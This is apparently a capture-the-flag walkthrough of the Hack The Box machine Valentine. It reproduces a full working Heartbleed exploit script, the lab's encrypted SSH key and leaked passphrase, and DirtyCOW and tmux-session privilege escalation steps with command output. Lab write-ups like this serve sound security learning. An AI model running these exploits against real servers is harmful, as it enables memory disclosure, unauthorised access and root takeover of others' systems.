# Valentine HTB, IP 10.10.10.79

#I nitial Enumeration

**1. nmap -sC -sV 10.10.10.79**

![v1](https://user-images.githubusercontent.com/15195048/94270358-c5aac580-fef4-11ea-9690-92d707758167.png)


**2. ./nmapAutomator.sh 10.10.10.79 All**


**ssl-css-injection**

![v2](https://user-images.githubusercontent.com/15195048/94270359-c6435c00-fef4-11ea-8f88-cbac237a3085.png)


**ssl-heartbleed**

![v3](https://user-images.githubusercontent.com/15195048/94270361-c6dbf280-fef4-11ea-9c45-8cbeefaa4834.png)


**ssl-poodle**

![v4](https://user-images.githubusercontent.com/15195048/94270364-c6dbf280-fef4-11ea-92bb-a2583b86d2d6.png)


The NMAP scan and enum scripts have three vulnerabilities discovered. Out of all of these Heartbleed is likely out attack vector as POODLE and CSS injection are both advanced man in the middle attacks. 

**3.SSLyze tool**

**sslyze 10.10.10.79**

![v5](https://user-images.githubusercontent.com/15195048/94270365-c7748900-fef4-11ea-9980-cb50883aa3e5.png)


**sslyze --heartbleed 10.10.10.79 (works)**

![v6](https://user-images.githubusercontent.com/15195048/94270366-c7748900-fef4-11ea-8946-68e104c87d33.png)

**4.Dirb/ Gobuster**

![v7](https://user-images.githubusercontent.com/15195048/94270367-c80d1f80-fef4-11ea-925a-3a06cb0d291f.png)

--------------------------------------------------------------------------------------------------------------------------------------
# Port Enumeration

## Enumerating port 80 & 443
 
**Interesting Files**
/dev

![v8](https://user-images.githubusercontent.com/15195048/94270368-c80d1f80-fef4-11ea-8f67-13f7c7547878.png)

notes.txt

![v9](https://user-images.githubusercontent.com/15195048/94270370-c8a5b600-fef4-11ea-9aec-250776e03d9c.png)

hype.key


![v10](https://user-images.githubusercontent.com/15195048/94270371-c8a5b600-fef4-11ea-8ec3-2512295c9e95.png)

decode

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


This key is **encrypted**, this means that we need to find a **passphrase**.


## Heatbleed exploitation

![v11](https://user-images.githubusercontent.com/15195048/94270372-c93e4c80-fef4-11ea-989f-3a7f0351c515.png)



I started looking for public exploits for Heartbleed and came across the following python script at
 https://stackabuse.com/how-to-exploit-the-heartbleed-bug/

**Python code:**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
  
import sys
import struct
import socket
import time
import select
from optparse import OptionParser
  
# ClientHello
helloPacket = (
'16 03 02 00 31'    # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
'01 00 00 2d'       # Message type = 01 (client hello); Length = 00 00 2d

'03 02'             # Client version = 03 02 (TLS 1.1)

# Random (uint32 time followed by 28 random bytes):
'50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
'00'                # Session id = 00
'00 04 '            # Cipher suite length
'00 33 c0 11'       # 4 cipher suites
'01'                # Compression methods length
'00'                # Compression method 0: no compression = 0
'00 00'             # Extensions length = 0
).replace(' ', '').decode('hex')


 

# This is the packet that triggers the memory over-read.
# The heartbeat protocol works by returning to the client the same data that was sent;
# that is, if we send "abcd" the server will return "abcd".

# The flaw is triggered when we tell the server that we are sending a message that is X bytes long
# (64 kB in this case), but we send a shorter message; OpenSSL won't check if we really sent the X bytes of data.

# The server will store our message, then read the X bytes of data from its memory
# (it reads the memory region where our message is supposedly stored) and send that read message back.

# Because we didn't send any message at all
# (we just told that we sent FF FF bytes, but no message was sent after that)
# when OpenSSL receives our message, it wont overwrite any of OpenSSL's memory.
# Because of that, the received message will contain X bytes of actual OpenSSL memory.


heartbleedPacket = (
'18 03 02 00 03'    # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
'01 FF FF'          # Heartbeat message type = 01 (request); Payload length = FF FF
                    # Missing a message that is supposed to be FF FF bytes long
).replace(' ', '').decode('hex')



options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')


def dump(s):
    packetData = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in s)
    print '%s' % (packetData)
    
  
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        # Wait until the socket is ready to be read
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
          

# When you request the 64 kB of data, the server won't tell you that it will send you 4 packets.
# But you expect that because TLS packets are sliced if they are bigger than 16 kB.
# Sometimes, (for some misterious reason) the server wont send you the 4 packets;
# in that case, this function will return the data that DO has arrived.

def receiveTLSMessage(s, fragments = 1):
    contentType = None
    version = None
    length = None
    payload = ''

    # The server may send less fragments. Because of that, this will return partial data.
    for fragmentIndex in range(0, fragments):
        tlsHeader = recvall(s, 5) # Receive 5 byte header (Content type, version, and length)

        if tlsHeader is None:
            print 'Unexpected EOF receiving record header - server closed connection'
            return contentType, version, payload # Return what we currently have

        contentType, version, length = struct.unpack('>BHH', tlsHeader) # Unpack the header
        payload_tmp = recvall(s, length, 5) # Receive the data that the server told us it'd send

        if payload_tmp is None:
            print 'Unexpected EOF receiving record payload - server closed connection'
            return contentType, version, payload # Return what we currently have

        print 'Received message: type = %d, ver = %04x, length = %d' % (contentType, version, len(payload_tmp))

        payload = payload + payload_tmp

    return contentType, version, payload
    

def exploit(s):
    s.send(heartbleedPacket)
    
    # We asked for 64 kB, so we should get 4 packets
    contentType, version, payload = receiveTLSMessage(s, 4)
    if contentType is None:
        print 'No heartbeat response received, server likely not vulnerable'
        return False

    if contentType == 24:
        print 'Received heartbeat response:'
        dump(payload)
        if len(payload) > 3:
            print 'WARNING: server returned more data than it should - server is vulnerable!'
        else:
            print 'Server processed malformed heartbeat, but did not return any extra data.'
        return True

    if contentType == 21:
        print 'Received alert:'
        dump(payload)
        print 'Server returned error, likely not vulnerable'
        return False
  
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(helloPacket)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    # Receive packets until we get a hello done packet
    while True:
        contentType, version, payload = receiveTLSMessage(s)
        if contentType == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if contentType == 22 and ord(payload[0]) == 0x0E:
            break
  
    print 'Sending heartbeat request...'
    sys.stdout.flush()
    
    # Jared Stafford's version sends heartbleed packet here too. It may be a bug.
    exploit(s)
  
if __name__ == '__main__':
    main()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



![v12](https://user-images.githubusercontent.com/15195048/94270376-c9d6e300-fef4-11ea-8a61-8f47f8ea5f52.png)


Looking closlely to the data, there is a base64 password. I decoded it

**echo -n ‘aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==’ | base64 -d**

**heartbleedbelievethehype**

Alternatively, I could use the website's page:
http://10.10.10.79/decode.php


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
chmod 600 rsa.key
ssh -i rsa.key hype@10.10.10.79
Enter passphrase for key 'rsa.key':heartbleedbelievethehype
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


user.txt
--------------------------------------------------------------------------------------------------------------
# Privilege escalation no1
After spending sometime enumerating the system, it seems that the kernel is outdated. It is running an old version of Ubuntu that is propably vulnerable to DirtyCOW. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


To confirm that the target machine is vulnerable to **Dirty COW** we run Linux Exploit Suggester script.
With these information, we can search for an existing exploit in order to escalate our privileges to root.
Link:https://www.exploit-db.com/exploits/40839

Notes:
As an overview, the DirtyCOW vulnerability is a race condition in the Linux kernel’s memory subsystem which handles the copy-on-write breakage of private read-only memory mappings. By exploiting this vulnerability, an unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings, thus increasing their privileges on the system.

Compile & execute **40839.c**
For the particular implementation of DirtyCow exploit we used, it automatically generates a new passwd file containing a new user “firefart” which overwrites the root account. After running the exploit we should be able to login with the newly created user with a password that we specify on a prompt. The original /etc/passwd file is then backed up to /tmp/passwd.bak.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hype@Valentine:/tmpgcc 40839.c -pthread -lcrypt -o 40839
hype@Valentine:/tmp ./40839
/etc/passwd successfully backed up to /tmp/passwd.bak

hype@Valentine:~$ head /etc/passwd
firefart:fi5FgEvdhZiPQ:0:0:pwned:/root:/bin/bash
/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh

hype@Valentine:/tmp$ su firefart
Password: 
firefart@Valentine:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


**Rooted**

# Privilege Escalation no2
There is an active tmux session that is owned by root.
It is basically a shell that is owned by root. So If we can enter this active tmux session, any command we wun will be executed as root.

**Manually find tmux process**
cat .bash_history
or 
ps -aux

![v13](https://user-images.githubusercontent.com/15195048/94270381-cb081000-fef4-11ea-8137-6e7ec15eb4bb.png)


Anyone can attach to this shell using  **tmux -S /.devs/dev_sess**. 
Once you drop into the shell, you will be root.

![v14](https://user-images.githubusercontent.com/15195048/94270383-cb081000-fef4-11ea-8603-593d47f55c60.png)

**Rooted**
